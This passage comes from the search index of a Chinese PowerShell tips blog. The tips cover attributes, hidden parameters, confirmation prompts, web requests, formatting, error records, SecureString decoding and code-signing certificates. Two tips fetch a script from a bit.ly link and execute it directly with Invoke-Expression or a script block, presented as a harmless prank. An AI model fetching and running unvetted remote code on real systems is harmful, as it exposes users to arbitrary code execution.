将变得可用，并且显示当前选中的公司可用的部门。","link":"/2018/10/31/using-dynamic-parameters/"},{"title":"PowerShell 技能连载 - 探索 PowerShell 属性值","text":"您也许知道，您可以对变量和参数添加属性来更有针对性地定义它们。例如，以下代码定义了一个包含只允许三个字符串之一的必选参数的函数： 12345678910111213function Test-Attribute{ [CmdletBinding()] param ( [string] [Parameter(Mandatory)] [ValidateSet(&quot;A&quot;,&quot;B&quot;,&quot;C&quot;)] $Choice ) &quot;Choice: $Choice&quot;} 如果您想知道这些属性有哪些选择，以下是实现方法。您所需要了解的是代表属性的真实名称。PowerShell 自身的属性都位于 System.Management.Automation 命名空间。以下是两个最常用的： 12[Parameter()] = [System.Management.Automation.ParameterAttribute][CmdletBinding()] = [System.Management.Automation.CmdletBindingAttribute] 要查看某个指定属性的合法数值，只需要实例化一个制定类型的对象，并查看它的属性： 123[System.Management.Automation.ParameterAttribute]::new() | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name 这将返回一个包含所有 [Parameter()] 属性所有合法属性值的列表： DontShow HelpMessage HelpMessageBaseName HelpMessageResourceId Mandatory ParameterSetName Position TypeId ValueFromPipeline ValueFromPipelineByPropertyName ValueFromRemainingArguments 当您向每个值添加期望的数据类型时，该列表就更有用了： 12345678[System.Management.Automation.ParameterAttribute]::new() | Get-Member -MemberType *Property | ForEach-Object { [PSCustomObject]@{ Name = $_.Name Type = ($_.Definition -split ' ')[0] } } 现在它看起来类似这样： 12345678910111213Name Type---- ----DontShow boolHelpMessage stringHelpMessageBaseName stringHelpMessageResourceId stringMandatory boolParameterSetName stringPosition intTypeId System.ObjectValueFromPipeline boolValueFromPipelineByPropertyName boolValueFromRemainingArguments bool 例如这是 [CmdletBinding()] 的列表： 12345678910111213141516171819202122[System.Management.Automation.CmdletBindingAttribute]::new() | Get-Member -MemberType *Property | ForEach-Object { [PSCustomObject]@{ Name = $_.Name Type = ($_.Definition -split ' ')[0] } }Name Type---- ----ConfirmImpact System.Management.Automation.ConfirmImpactDefaultParameterSetName stringHelpUri stringPositionalBinding boolRemotingCapability System.Management.Automation.RemotingCapabilitySupportsPaging boolSupportsShouldProcess boolSupportsTransactions boolTypeId System.Object","link":"/2018/11/01/exploring-powershell-attribute-values/"},{"title":"PowerShell 技能连载 - 隐藏参数","text":"In the previous tip we explained how you can dump all the legal values for a PowerShell attribute. Today we’ll take a look at the [Parameter()] attribute and its value DontShow. Take a look at this function:在前一个技能中我们介绍了如何导出一个 PowerShell 属性的所有合法值。今天我们将关注 [Parameter()] 属性和它的值 DontShow。我们来看看这个函数： 12345678910111213141516171819function Test-Something{ param ( [string] [Parameter(Mandatory)] $Name, [Parameter(DontShow)] [Switch] $Internal ) &quot;You entered: $name&quot; if ($Internal) { Write-Warning &quot;We are in secret test mode!&quot; }} 当您运行这个函数时，IntelliSense 只暴露 -Name 参数。-Internal switch 参数并没有显示，然而您仍然可以使用它。它只是一个隐藏的参数： 123456PS&gt; Test-Something -Name tobiasYou entered: tobiasPS&gt; Test-Something -Name tobias -InternalYou entered: tobiasWARNING: We are in secret test mode!","link":"/2018/11/02/hiding-parameters/"},{"title":"PowerShell 技能连载 - 将对象转换为哈希表","text":"在之前的一个技能中我们介绍了如何用 Get-Member 获取对象的属性。以下是另一个可以传入任何对象，将它转为一个包含排序属性的哈希表，然后排除所有空白属性的用例。 123456789101112131415161718192021222324252627282930313233# take an object...$process = Get-Process -id $pid# ...and turn it into a hash table$hashtable = $process | ForEach-Object { $object = $_ # determine the property names in this object and create a # sorted list $columns = $_ | Get-Member -MemberType *Property | Select-Object -ExpandProperty Name | Sort-Object # create an empty hash table $hashtable = @{} # take all properties, and add keys to the hash table for each property $columns | ForEach-Object { # exclude empty properties if (![String]::IsNullOrEmpty($object.$_)) { # add a key (property) to the hash table with the # property value $hashtable.$_ = $object.$_ } } $hashtable}$hashtable | Out-GridView","link":"/2018/11/05/turning-objects-into-hash-tables/"},{"title":"PowerShell 技能连载 - 隐藏通用属性","text":"在前一个技能中我们解释了如何在 IntelliSense 中隐藏参数。今天我们想向您介绍一个很酷的副作用！ PowerShell 支持两种类型的函数：简单函数和高级函数。一个简单的函数只暴露了您定义的参数。高级函数还加入了所有常见的参数。以下是两个示例函数： 12345678910111213141516function Simple{ param ( $Name )}function Advanced{ param ( [Parameter(Mandatory)] $Name )} 当您在编辑器中通过 IntelliSense 调用 Simple 函数，您只能见到 -Name 参数。当您调用 Advanced 函数时，还能看到一系列常见的参数，这些参数总是出现。 当您使用一个属性（属性的模式为 [Name(Value)]），PowerShell 将创建一个高级函数，并且无法排除通用参数。那么如何既保留高级函数的优点（例如必选参数）但只向用户显示自己的参数呢？ 以下是一个秘籍。请对比以下两个函数： 1234567891011121314151617181920212223242526272829303132333435function Advanced{ param ( [Parameter(Mandatory)] [string] $Name, [int] $Id, [switch] $Force )}function AdvancedWithoutCommon{ param ( [Parameter(Mandatory)] [string] $Name, [int] $Id, [switch] $Force, # add a dummy &quot;DontShow&quot; parameter [Parameter(DontShow)] $Anything )} 当调用 “Advanced“ 函数时，将显示自定义的参数以及通用参数。当对 “AdvancedWithoutCommon“ 做相同的事时，只会见到自定义的参数但保留高级函数的功能，例如 -Name 参数仍然是必选的。 这种效果是通过添加一个或多个隐藏参数实现的。隐藏参数是从 PowerShell 5 开始引入的，用于加速类方法（禁止显示隐藏属性）。由于类成员不显示通用参数，所以属性值 “DontShow“ 不仅从 IntelliSense 中隐藏特定的成员，而且隐藏所有通用参数。 这恰好导致另一个有趣的结果：虽然通用参数现在从 IntelliSense 中隐藏，但他们仍然存在并且可使用： 123456789101112131415161718192021222324function Test{ param ( [Parameter(Mandatory)] [string] $Name, # add a dummy &quot;DontShow&quot; parameter [Parameter(DontShow)] $Anything ) Write-Verbose &quot;Hello $Name&quot;}PS&gt; Test -Name tomPS&gt; Test -Name tom -VerboseVERBOSE: Hello tomPS&gt;","link":"/2018/11/06/hiding-common-parameters/"},{"title":"PowerShell 技能连载 - 添加额外的安全防护","text":"如果您正在编写 PowerShell 函数，并且知道某个函数可能会造成很多危险结果，那么有一个简单的方法可以增加一层额外的安全防护。以下是了个函数，一个没有安全防护，而另一个有安全防护： 1234567891011121314151617181920212223242526272829function NoSafety{ param ( [Parameter(Mandatory)] $Something ) &quot;HARM DONE with $Something!&quot;}function Safety{ # step 1: add -WhatIf and -Confirm, and mark as harmful [CmdletBinding(SupportsShouldProcess,ConfirmImpact=&quot;High&quot;)] param ( [Parameter(Mandatory)] $Something ) # step 2: abort function when confirmation was rejected if (!$PSCmdlet.ShouldProcess($env:computername, &quot;doing something harmful&quot;)) { Write-Warning &quot;Aborted!&quot; return } &quot;HARM DONE with $Something!&quot;} 当您运行 “NoSafety“，直接运行完毕。而当您运行 “Safety“，用户会得到一个确认提示，只有确认了该提示，函数才能继续执行。 要实现这个有两个步骤。第一，[CmdletBinding(...)] 语句增加了 WhatIf 和 -Confirm 参数，而 ConfirmImpact=&quot;High&quot; 将函数标记为有潜在危险的。 第二，在函数代码中的第一件事情是调用 $PSCmdlet.ShouldProcess，在其中你可以定义确认信息。如果这个调用返回 $false，那么代码中的 -not 操作符 (!) 将抛出结果，而该函数立即返回。 用户仍然可以通过显式关闭确认的方式，不需确认运行该函数： 12PS&gt; Safety -Something test -Confirm:$falseHARM DONE with test! 或者，通过设置 $ConfirmPreference 为 “None“，直接将本 PowerShell 会话中的所有的自动确认对话框关闭： 1234PS&gt; $ConfirmPreference = &quot;None&quot;PS&gt; Safety -Something testHARM DONE with test!","link":"/2018/11/07/adding-extra-safety-net/"},{"title":"PowerShell 技能连载 - 分析 WEB 页面内容","text":"PowerShell 内置了一个 WEB 客户端，它可以获取 HTML 内容。对于简单的 WEB 页面分析，使用 -UseBasicParsing 参数即可。该操作将原原本本地获取原始的 HTML 内容，例如，包含嵌入的链接和图像的列表： 123456$url = &quot;http://powershellmagazine.com&quot;$page = Invoke-WebRequest -URI $url -UseBasicParsing$page.Content | Out-GridView -Title Content$page.Links | Select-Object href, OuterHTML | Out-GridView -Title Links$page.Images | Select-Object src, outerHTML | Out-GridView -Title Images 如果忽略了 -UseBasicParsing 参数，那么该 cmdlet 内部使用 Internet Explorer 文档对象模型，并返回更详细的信息： 1234$url = &quot;http://powershellmagazine.com&quot;$page = Invoke-WebRequest -URI $url$page.Links | Select-Object InnerText, href | Out-GridView -Title Links 请注意 Invoke-WebRequest 需要您实现设置并且至少打开一次 Internet Explorer，除非您指定了 -UseBasicParsing。","link":"/2018/11/08/analyzing-web-page-content/"},{"title":"PowerShell 技能连载 - 隐藏进度条","text":"有些时候，cmdlet 自动显示一个进度条，以下是一个显示进度条的例子： 12$url = &quot;http://www.powertheshell.com/reference/wmireference/root/cimv2/&quot;$page = Invoke-WebRequest -URI $url Invoke-WebRequest 获取一个 WEB 页面的原始内容，如果获取内容消耗一定的时间，将会显示进度条。 Whenever you run a cmdlet that shows a progress bar, you can hide the progress bar by temporarily changing the $ProgressPreference variable. Just make sure you restore its original value or else, you permanently hide progress bars for the current PowerShell session:当您运行一个会显示进度条的 cmdlet，您可以通过临时改变 $ProgressPreference 变量来隐藏进度条。只需要记得恢复它的初始值或是设置成其它值，这样就可以针对当前 PowerShell 会话隐藏进度条。 1234567$old = $ProgressPreference$ProgressPreference = &quot;SilentlyContinue&quot;$url = &quot;http://www.powertheshell.com/reference/wmireference/root/cimv2/&quot;$page = Invoke-WebRequest -URI $url$ProgressPreference = $old 除了保存和恢复原始的变量内容，您还可以使用脚本块作用域： 1234567&amp; { $ProgressPreference = &quot;SilentlyContinue&quot; $url = &quot;http://www.powertheshell.com/reference/wmireference/root/cimv2/&quot; $page = Invoke-WebRequest -URI $url}$ProgressPreference 如您所见，当脚本块执行完之后，原始变量自动恢复原始值。","link":"/2018/11/09/hiding-progress-bars-2/"},{"title":"PowerShell 技能连载 - 下载 PowerShell 代码","text":"在之前的技能中我们介绍了如何用 Invoke-WebRequest 下载任意网页的 HTML 内容。这也可以用来下载 PowerShell 代码。Invoke-WebRequest 可以下载任意 WEB 服务器提供的内容，所以以下示例代码可以下载一段 PowerShell 脚本： 1234$url = &quot;http://bit.ly/e0Mw9w&quot;$page = Invoke-WebRequest -Uri $url$code = $page.Content$code | Out-GridView 如果您信任这段代码，您可以方便地下载和运行它： 1Invoke-Expression -Command $code 这段代码适用于 PowerShell 控制台，您将见到一个“跳舞的 Rick Ascii 艺术”并听到有趣的音乐，如果在另一个编辑器中运行以上代码，您的 AV 可能会阻止该调用并且将它识别为一个严重的威胁。这是因为下载的代码会检测它运行的环境，由于它需要在控制台中运行，所以如果在其它地方运行它，将会启动一个 PowerShell 控制台。这个操作是由杀毒引擎控制的，随后会被系统阻止。","link":"/2018/11/12/downloading-powershell-code/"},{"title":"PowerShell 技能连载 - Invoke-WebRequest vs. Invoke-RestMethod","text":"Invoke-WebRequest 只是简单地从任意的网站下载内容。接下来读取内容并分析它，是您的工作。在前一个技能中我们解释了如何下载 PowerShell 代码，并且执行它： 12345$url = &quot;http://bit.ly/e0Mw9w&quot;$page = Invoke-WebRequest -Uri $url$code = $page.Content$sb = [ScriptBlock]::Create($code)&amp; $sb （请注意：请在 PowerShell 控制台中运行以上代码。如果在 PowerShell ISE 等编辑器中运行，杀毒引擎将会阻止运行） 类似地，如果数据是以 XML 格式返回的，您可以将它转换为 XML。并且做进一步处理，例如从银行获取当前的汇率： 1234$url = &quot;http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml&quot;$page = Invoke-WebRequest -Uri $url$data = $page.Content -as [xml]$data.Envelope.Cube.Cube.Cube 作为对比，Invoke-RestMethod 不仅仅下载数据，而且遵循数据的类型。您会自动得到正确的数据。以下是上述操作的简化版本，用的是 Invoke-RestMethod 来代替 Invoke-WebRequest： 调用 Rick-Ascii（从 PowerShell 控制台运行）： 1234$url = &quot;http://bit.ly/e0Mw9w&quot;$code = Invoke-RestMethod -Uri $url$sb = [ScriptBlock]::Create($code)&amp; $sb 获取货币汇率： 123$url = &quot;http://www.ecb.europa.eu/stats/eurofxref/eurofxref-daily.xml&quot;$data = Invoke-RestMethod -Uri $url$data.Envelope.Cube.Cube.Cube","link":"/2018/11/13/invoke-webrequest-vs-invoke-restmethod/"},{"title":"PowerShell 技能连载 - 在 PowerShell 标题栏显示 RSS 标题","text":"一个新的 PowerShell 后台线程可以在后台工作，例如每 5 秒钟在 PowerShell 窗口标题栏上显示新的 RSS 供稿。 首先，我们先看看如何获取新闻供稿内容： 12345$RSSFeedUrl = 'https://www.technologyreview.com/stories.rss'$xml = Invoke-RestMethod -Uri $RSSFeedUrl$xml | ForEach-Object { &quot;{0} {1}&quot; -f $_.title, $_.description} 可以自由调整 RSS 公告的地址。如果修改了地址，请也注意调整 “title“ 和 “description“ 属性名。每个 RSS 供稿可以任意命名这些属性。 以下是向标题栏添加新内容的完整解决方案： 123456789101112131415161718192021222324$Code = { # receive the visible PowerShell window reference param($UI) # get RSS feed messages $RSSFeedUrl = 'https://www.technologyreview.com/stories.rss' $xml = Invoke-RestMethod -Uri $RSSFeedUrl # show a random message every 5 seconds do { $message = $xml | Get-Random $UI.WindowTitle = &quot;{0} {1}&quot; -f $message.title, $message.description Start-Sleep -Seconds 5 } while ($true)}# create a new PowerShell thread$ps = [PowerShell]::Create()# add the code, and a reference to the visible PowerShell window$null = $ps.AddScript($Code).AddArgument($host.UI.RawUI)# launch background thread$null = $ps.BeginInvoke()","link":"/2018/11/14/adding-rss-ticker-to-powershell-title-bar/"},{"title":"PowerShell 技能连载 - 从目录结构中删除所有文件","text":"有些任务听起来复杂，实际上并没有那么复杂。假设我们需要清除一个目录结构，移除所有文件，而留下空白的文件夹。我们进一步假设有一些文件位于白名单上，不应移除。如果用 PowerShell，那么实现起来很容易： 123456789101112# Task:# remove all files from a folder structure, but keep all folders,# and keep all files on a whitelist$Path = &quot;c:\\sample&quot;$WhiteList = &quot;important.txt&quot;, &quot;something.csv&quot;Get-ChildItem -Path $Path -File -Exclude $WhiteList -Recurse -Force | # remove -WhatIf if you want to actually delete files# ATTENTION: test thoroughly before doing this!# you may want to add -Force to Remove-Item to forcefully remove files Remove-Item -WhatIf","link":"/2018/11/15/deleting-all-files-from-a-folder-structure/"},{"title":"PowerShell 技能连载 - 删除所有指定层级下的子文件夹","text":"以下是另一个听起来复杂，但实际上并没有那么复杂的文件系统任务。假设您需要移除某个文件系统指定层级之下所有文件夹。以下是实现方法： 12345678# Task:# remove all folders one level below the given pathGet-ChildItem -Path &quot;c:\\sample\\*\\&quot; -Directory -Recurse | # remove -WhatIf to actually delete # ATTENTION: test thoroughly before doing this! # you may want to add -Force to Remove-Item to forcefully delete Remove-Item -Recurse -WhatIf 只需要在路径中使用 “*“。要删除某个指定路径下的两层之下的目录，相应地做以下调整： 12345678# Task:# remove all folders TWO levels below the given pathGet-ChildItem -Path &quot;c:\\sample\\*\\*\\&quot; -Directory -Recurse | # remove -WhatIf to actually delete # ATTENTION: test thoroughly before doing this! # you may want to add -Force to Remove-Item to forcefully delete Remove-Item -Recurse -WhatIf","link":"/2018/11/16/deleting-all-subfolders-below-a-given-level/"},{"title":"PowerShell 技能连载 - 查找所有二级深度的文件","text":"这是另一个文件系统的任务：列出一个文件夹结构中所有 *.log 文件，但最多只包含 2 级文件夹深度： 12Get-ChildItem -Path c:\\windows -Filter *.log -Recurse -Depth 2 -File -Force -ErrorAction SilentlyContinue | Select-Object -ExpandProperty FullName 幸运的是，PowerShell 5 对 Get-ChildItem 命令增加了好用的 -Depth 选项。","link":"/2018/11/19/find-all-files-two-levels-deep/"},{"title":"PowerShell 技能连载 - 在输出中显示数组成员","text":"当您输出包含数组属性的对象时，只会显示 4 个数组元素，然后用省略号截断剩余的结果： 12345678910PS C:\\&gt; Get-Process | Select-Object -Property Name, Threads -First 6Name Threads---- -------acrotray {3160}AERTSr64 {1952, 1968, 1972, 8188}AGSService {1980, 1988, 1992, 2000...}armsvc {1920, 1940, 1944, 7896}audiodg {7436, 1460, 2192, 6784}ccSvcHst {2584, 2644, 2656, 2400...} 要显示更多（或是全部）数组元素，请使用内置的 $FormatEnumerationLimit 变量。它的缺省值是 4，但是您可以将它改为希望显示的元素个数，或将它设置为 -1 来显示所有的元素： 123456789101112131415161718192021222324252627282930313233343536373839404142PS C:\\&gt; $FormatEnumerationLimit = 1PS C:\\&gt; Get-Process | Select-Object -Property Name, Threads -First 6Name Threads---- -------acrotray {3160}AERTSr64 {1952...}AGSService {1980...}armsvc {1920...}audiodg {7436...}ccSvcHst {2584...}PS C:\\&gt; $FormatEnumerationLimit = 2PS C:\\&gt; Get-Process | Select-Object -Property Name, Threads -First 6Name Threads---- -------acrotray {3160}AERTSr64 {1952, 1968...}AGSService {1980, 1988...}armsvc {1920, 1940...}audiodg {7436, 2192...}ccSvcHst {2584, 2644...}PS C:\\&gt; $FormatEnumerationLimit = -1PS C:\\&gt; Get-Process | Select-Object -Property Name, Threads -First 6Name Threads---- -------acrotray {3160}AERTSr64 {1952, 1968, 1972, 8188}AGSService {1980, 1988, 1992, 2000, 2024, 7932}armsvc {1920, 1940, 1944, 7896}audiodg {7436, 2192, 6784, 4540, 8040}ccSvcHst {2584, 2644, 2656, 2400, 3080, 3120, 3124, 3128, 3132, 3136, 3140,... 当您把值设为 -1，当一行的剩余空间用完的时候截断。如果仍要显示所有值，请显式地使用 Format-Table 和 -Wrap 参数： 123456789101112131415161718192021PS C:\\&gt; Get-Process | Select-Object -Property Name, Threads -First 6 | Format-Table -WrapName Threads---- -------acrotray {3160}AERTSr64 {1952, 1968, 1972, 8188}AGSService {1980, 1988, 1992, 2000, 2024, 7932}armsvc {1920, 1940, 1944, 7896}audiodg {7436, 2192, 6784, 4540, 8040}ccSvcHst {2584, 2644, 2656, 2400, 3080, 3120, 3124, 3128, 3132, 3136, 3140, 3144, 3232, 3240, 3248, 3260, 3268, 3288, 3304, 3344, 3492, 3552, 3556, 3568, 3572, 3576, 3580, 3596, 3600, 3604, 3612, 3616, 3708, 3712, 3716, 3724, 3732, 3736, 3760, 3764, 3768, 3776, 3780, 3796, 3800, 3804, 3816, 3820, 3824, 3828, 3832, 3844, 3888, 3892, 4232, 5084, 5088, 3112, 7100, 7016, 480, 3020, 3044, 4744, 7148, 1828, 6476, 6516, 6524, 7160, 6652, 7000, 964, 6028, 4644, 4828, 6664, 7892, 5820, 8180, 4940, 5956, 7684, 7156}PS C:\\&gt;","link":"/2018/11/20/displaying-array-members-in-output/"},{"title":"PowerShell 技能连载 - $FormatEnumerationLimit 作用域问题","text":"如前一个技能所述，$FormatEnumerationLimit 隐藏变量决定了输出时会在多少个元素后截断。以下是再次演示该区别的例子： 123456789$default = $FormatEnumerationLimitGet-Process | Select-Object -Property Name, Threads -First 5 | Out-Default$FormatEnumerationLimit = 1Get-Process | Select-Object -Property Name, Threads -First 5 | Out-Default$FormatEnumerationLimit = -1Get-Process | Select-Object -Property Name, Threads -First 5 | Out-Default$FormatEnumerationLimit = $default 输出结果类似这样： 123456789101112131415161718192021222324252627Name Threads---- -------acrotray {3160}AERTSr64 {1952, 1968, 1972, 8188}AGSService {1980, 1988, 1992, 2000...}armsvc {1920, 1940, 1944, 7896}ccSvcHst {2584, 2644, 2656, 2400...}Name Threads---- -------acrotray {3160}AERTSr64 {1952...}AGSService {1980...}armsvc {1920...}ccSvcHst {2584...}Name Threads---- -------acrotray {3160}AERTSr64 {1952, 1968, 1972, 8188}AGSService {1980, 1988, 1992, 2000, 2024, 7932}armsvc {1920, 1940, 1944, 7896}ccSvcHst {2584, 2644, 2656, 2400, 3080, 3120, 3124, 3128, 3132, 3136, 3140,... 然而这在函数（或是脚本块等情况）中使用时可能会失败： 1234567function Test-Formatting{ $FormatEnumerationLimit = 1 Get-Process | Select-Object -Property Name, Threads -First 5}Test-Formatting 虽然 $FormatEnumerationLimit 设置为 1，但数组仍然按缺省的显示 4 个元素。这是因为 $FormatEnumerationLimit 只对全局作用域有效。您需要在全局作用域中改变该变量才有效。所以需要用这种方法来写一个函数： 1234567891011121314function Test-Formatting{ # remember the current setting $default = $global:FormatEnumerationLimit # change on global scope $global:FormatEnumerationLimit = 1 Get-Process | Select-Object -Property Name, Threads -First 5 # at the end, clean up and revert to old value $global:FormatEnumerationLimit = $default}Test-Formatting","link":"/2018/11/21/formatenumerationlimit-scoping-issues/"},{"title":"PowerShell 技能连载 - 创建写保护的函数","text":"PowerShell 的函数缺省情况下可以在任何时候被覆盖，而且可以用 Remove-Item 来移除它： 12345678910function Test-Lifespan{ &quot;Hello!&quot;}Test-LifespanRemove-Item -Path function:Test-LifespanTest-Lifespan 对于安全相关的函数，您可能希望以某种不会被删除的方式创建它们。以下是实现方法： 1234567$FuncName = 'Test-ConstantFunc'$Expression = { param($Text) &quot;Hello $Text, I cannot be removed!&quot;}Set-Item -Path function:$FuncName -Value $Expression -Options Constant,AllScope 这个新函数是用 Set-Item 直接在 function: 驱动器内创建。通过这种方式，您可以对该函数增加新的选项，例如 Constant 和 AllScope。这个函数能够以期待的方式工作： 12PS C:\\&gt; Test-ConstantFunc -Text $env:usernameHello DemoUser, I cannot be removed! “Constant“ 确保该函数无法被覆盖或是被删除： 12345678910111213141516171819PS C:\\&gt; function Test-ConstantFunc { &quot;Got you!!&quot; }Cannot write to function Test-ConstantFunc because it is read-only or constant.At line:1 char:1+ function Test-ConstantFunc { &quot;got you!!&quot; }+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : WriteError: (Test-ConstantFunc:String) [], Sessio nStateUnauthorizedAccessException + FullyQualifiedErrorId : FunctionNotWritablePS C:\\&gt; Remove-Item -Path function:Test-ConstantFuncRemove-Item : Cannot remove function Test-ConstantFunc because it is constant.At line:1 char:1+ Remove-Item -Path function:Test-ConstantFunc+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : WriteError: (Test-ConstantFunc:String) [Remove-It em], SessionStateUnauthorizedAccessException + FullyQualifiedErrorId : FunctionNotRemovable,Microsoft.PowerShell.Command s.RemoveItemCommand 更重要的是，”AllScope“ 确保该函数无法在子作用域中被掩盖。有了写保护之后，在一个常见的用独立的子作用于来定义一个同名的新函数的场景中： 12345&amp; { function Test-ConstantFunc { &quot;I am the second function in a child scope!&quot; } Test-ConstantFunc} 结果是，因为 “AllScope“ 的作用，将原来的保护函数覆盖的操作不再起作用： Cannot write to function Test-ConstantFunc because it is read-only or constant. At line:4 char:3 + function Test-ConstantFunc { &quot;I am a second function in a child sco ... + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : WriteError: (Test-ConstantFunc:String) [], Sessio nStateUnauthorizedAccessException + FullyQualifiedErrorId : FunctionNotWritable Hello , I cannot be removed!","link":"/2018/11/22/creating-write-protected-functions/"},{"title":"PowerShell 技能连载 - 增强错误记录的可读性","text":"当 PowerShell 遇到错误时，它将抛出包含关于该错误详细信息的错误记录。不幸的是，这些对象有点儿难懂，而且缺省情况下不会显示所有信息。相比之下，以下函数有着无价的帮助信息： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546function ConvertFrom-ErrorRecord{ param ( # we receive either a legit error record... [Management.Automation.ErrorRecord[]] [Parameter( Mandatory,ValueFromPipeline, ParameterSetName='ErrorRecord')] $ErrorRecord, # ...or a special stop exception which is raised by # cmdlets with -ErrorAction Stop [Management.Automation.ActionPreferenceStopException[]] [Parameter( Mandatory,ValueFromPipeline, ParameterSetName='StopException')] $Exception ) process { # if we received a stop exception in $Exception, # the error record is to be found inside of it # in all other cases, $ErrorRecord was received # directly if ($PSCmdlet.ParameterSetName -eq 'StopException') { $ErrorRecord = $Exception.ErrorRecord } # compose a new object out of the interesting properties # found in the error record object $ErrorRecord | ForEach-Object { [PSCustomObject]@{ Exception = $_.Exception.Message Reason = $_.CategoryInfo.Reason Target = $_.CategoryInfo.TargetName Script = $_.InvocationInfo.ScriptName Line = $_.InvocationInfo.ScriptLineNumber Column = $_.InvocationInfo.OffsetInLine } } }} 您可以在 $error 中辨认出收集到的错误信息： 1PS C:\\&gt; $Error | ConvertFrom-ErrorRecord | Out-GridView 您也可以在 try..catch 代码快中使用它： 123456789try{ Get-Service -Name foo -ErrorAction Stop}catch{ $_ | ConvertFrom-ErrorRecord} 结果类似这样： Exception : Cannot find any service with service name 'foo'. Reason : ServiceCommandException Target : foo Script : Line : 5 Column : 3 您甚至可以用 -ErrorVariable 通用参数来收集一个 cmdlet 运行时发生的所有错误记录： 12$r = Get-ChildItem -Path $env:windir -Filter *.ps1 -Recurse -ErrorAction SilentlyContinue -ErrorVariable test$test | ConvertFrom-ErrorRecord 相同地，结果类似这样： Exception : Access to the path 'C:\\Windows\\AppCompat\\Appraiser\\Telemetry' is denied. Reason : UnauthorizedAccessException Target : C:\\Windows\\AppCompat\\Appraiser\\Telemetry Script : Line : 3 Column : 6 Exception : Access to the path 'C:\\Windows\\AppCompat\\Programs' is denied. Reason : UnauthorizedAccessException Target : C:\\Windows\\AppCompat\\Programs Script : Line : 3 Column : 6 Exception : Access to the path 'C:\\Windows\\CSC\\v2.0.6' is denied. Reason : UnauthorizedAccessException Target : C:\\Windows\\CSC\\v2.0.6 Script : Line : 3 Column : 6 ...","link":"/2018/11/23/making-error-records-more-readable/"},{"title":"PowerShell 技能连载 - 使用目录文件","text":"目录文件支持 (.cat) 是 PowerShell 5.1 新引入的特性。目录文件基本上是包含哈希值的文件列表。您可以用它们来确保一个指定的文件结构没有改变。 以下是一个简单的示例。它输入一个文件夹（请确保文件夹存在，否则将它重命名）并对整个文件夹的内容创建一个目录文件。请注意这将对文件夹中的每个文件创建一个哈希值，所以请留意文件夹的体积不要太大： 123$path = c:\\folderToCheck&quot;$catPath = &quot;$home\\Desktop\\summary.cat&quot;New-FileCatalog -Path $path -CatalogVersion 2.0 -CatalogFilePath $catPath New-FileCatalog 将在桌面上创建一个 summary.cat 文件。这个文件可以用于测试文件夹结构并确保文件没有改变过： 1Test-FileCatalog -Detailed -Path $path -CatalogFilePath $catPath 结果看起来类似这样： Status : Valid HashAlgorithm : SHA1 CatalogItems : {[remoting systeminventar.ps1, F43C8D6F9CB93FB9AA5DBA6733D9996645832256], [klonen und prozessprio.ps1, F3DE20424CD90CDB5B85933B777A2F9A3F3D3187], [scriptblock rueckgabewerte.ps1, EB239D7906EF42E2639CACBE68C6FDD8F4AD899F], [Untitled4.ps1, E5E4DC20934287ED869230706A1DEEDEB550B8DE]...} PathItems : {[beispielsyntax.ps1, 5183C82B7F0F3D0623242DD5F97A658724BE3B81], [closure.ps1, D2A036B068548B3E773E3BEBCF40997231576ED1], [debug1.ps1, 3547D2659792A9ABA9E6E12F287D7A8116540FCF], [debug2.ps1, 76C63FA578C09F30DF2BE055C37C039AFB1EFEDE]...} Signature : System.Management.Automation.Signature 请注意 New-FileCatalog 当前并不支持路径中的特殊字符，例如德语的 “Umlaute”。","link":"/2018/11/26/using-catalog-files/"},{"title":"PowerShell 技能连载 - 将安全字符串转换为明文","text":"安全字符串的内容并不能很轻易地查看： 123456$password = Read-Host -Prompt 'Your password' -AsSecureStringPS C:\\&gt; $passwordSystem.Security.SecureString 然而，如果您是第一个要求安全字符串的人，您可以用这个聪明的技巧轻松地将它转换为纯文本： 12$txt = [PSCredential]::new(&quot;X&quot;, $Password).GetNetworkCredential().Password$txt 本质上，SecureString 是用来创建一个 PSCredential 对象，并且一个 PSCredential 对象包含了 GetNetworkCredential() 方法，它能够自动地将加密的密码转换为明文。 通过这种方式，您可以使用 Red-Hsot -AsSecureString 提供的遮罩输入框来输入敏感信息，即便您需要该信息的明文字符串： 12345678910111213function Read-HostSecret([Parameter(Mandatory)]$Prompt){ $password = Read-Host -Prompt $Prompt -AsSecureString [PSCredential]::new(&quot;X&quot;, $Password).GetNetworkCredential().Password}PS C:\\&gt; Read-HostSecret -Prompt 'Your secret second first name'Your secret second first name: ********ValentinPS C:\\&gt;","link":"/2018/11/27/converting-securestring-to-clear-text/"},{"title":"PowerShell 技能连载 - 代码签名迷你系列（第 1 部分：创建证书）","text":"要使用数字签名，以及探索如何对脚本和模块签名，您首先需要代码签名证书。如果您无法从公司的 IT 部门获取到代码签名证书，PowerShell 可以为您创建一个（假设您使用的是 Windows 10 或者 Server 2016）。 我们将这些细节封装为一个名为 New-CodeSigningCert 的易用的函数，它可以在个人证书存储中创建新的代码签名证书，并且以 pfx 文件的形式返回新创建的证书。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647function New-CodeSigningCert{ [CmdletBinding(DefaultParametersetName=&quot;__AllParameterSets&quot;)] param ( [Parameter(Mandatory)] [String] $FriendlyName, [Parameter(Mandatory)] [String] $Name, [Parameter(Mandatory,ParameterSetName=&quot;Export&quot;)] [SecureString] $Password, [Parameter(Mandatory,ParameterSetName=&quot;Export&quot;)] [String] $FilePath, [Switch] $Trusted ) $cert = New-SelfSignedCertificate -KeyUsage DigitalSignature -KeySpec Signature -FriendlyName $FriendlyName -Subject &quot;CN=$Name&quot; -KeyExportPolicy ExportableEncrypted -CertStoreLocation Cert:\\CurrentUser\\My -NotAfter (Get-Date).AddYears(5) -TextExtension @('2.5.29.37={text}1.3.6.1.5.5.7.3.3') if ($Trusted) { $Store = New-Object system.security.cryptography.X509Certificates.x509Store(&quot;Root&quot;, &quot;CurrentUser&quot;) $Store.Open(&quot;ReadWrite&quot;) $Store.Add($cert) $Store.Close() } $parameterSet = $PSCmdlet.ParameterSetName.ToLower() if ($parameterSet -eq &quot;export&quot;) { $cert | Export-PfxCertificate -Password $Password -FilePath $FilePath $cert | Remove-Item explorer.exe /select,$FilePath } else { $cert 